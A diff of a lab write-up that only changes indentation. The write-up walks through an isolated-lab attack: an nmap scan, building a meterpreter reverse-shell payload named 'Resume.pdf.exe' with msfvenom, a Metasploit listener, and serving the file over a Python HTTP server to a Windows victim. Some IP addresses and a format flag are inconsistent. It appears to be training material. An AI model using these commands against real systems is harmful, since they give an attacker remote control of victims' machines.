@@ -41,27 +41,27 @@ In this lab, the lab environment was not connected to the Internet because of th
 
 2-Attack Scenario 
 
-- First I did a port scan with 'nmap' and saw that RDP port 3389 was open. nmap –A 
-    - 192.168.10.100 -Pn 
+- First I did a port scan with 'nmap' and saw that RDP port 3389 was open.
+  - nmap 192.168.10.100 -A -Pn 
 
 - Secondly, I created malware with the 'msfvenom' payload. Here I chose the 'meterpreter/reverse_tcp' payload. 
-    - msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.250 lport=4444 -f ece -o Resume.pdf.exe 
+  - msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.250 lport=4444 -f ece -o Resume.pdf.exe 
 
 - With this malware we will obtain a 'reverse shell' and create a connection to our own machine. After logging into the msfconsole where I will execute the attack, I entered the values for the payload we selected and started the attack.
-    - use exploit/multi/handler 
-    - options #to see what we can configure 
-    - set payload windows/x64/meterpreter/reverse_tcp 
-    - set lhost 192.168.2.250 
-    - set lport 4444 #this is already given 
-    - exploit 
+  - use exploit/multi/handler 
+  - options #to see what we can configure 
+  - set payload windows/x64/meterpreter/reverse_tcp 
+  - set lhost 192.168.2.250 
+  - set lport 4444 #this is already given 
+  - exploit 
 
 - After that, we wait for the victim machine to run the malware. For this we will create an HTTP Server on the Kali Linux machine so that the victim machine can download the malware from there. 
-    - python3 -m http.server 9999 #make sure to run it in the directory where the malware is located 
+  - python3 -m http.server 9999 #make sure to run it in the directory where the malware is located 
 
 3-Exploitation 
  
 - First we need to deactivate Windows Security on the Windows (victim) machine. Then I connected to the 192.168.0.250:9999 server from the web browser and downloaded the malware file 'Resume.pdf.exe' and ran it. When I looked at the network connections from the cmd console, I saw that there was a TCP connection from 192.168.10.100 to 192.168.10.250. 
-    - netstat -anob 
+  - netstat -anob 
 
 - After that, we can now connect to the Windows machine with the 'shell' command on the Kali Linux machine and enter the commands we want. 
 
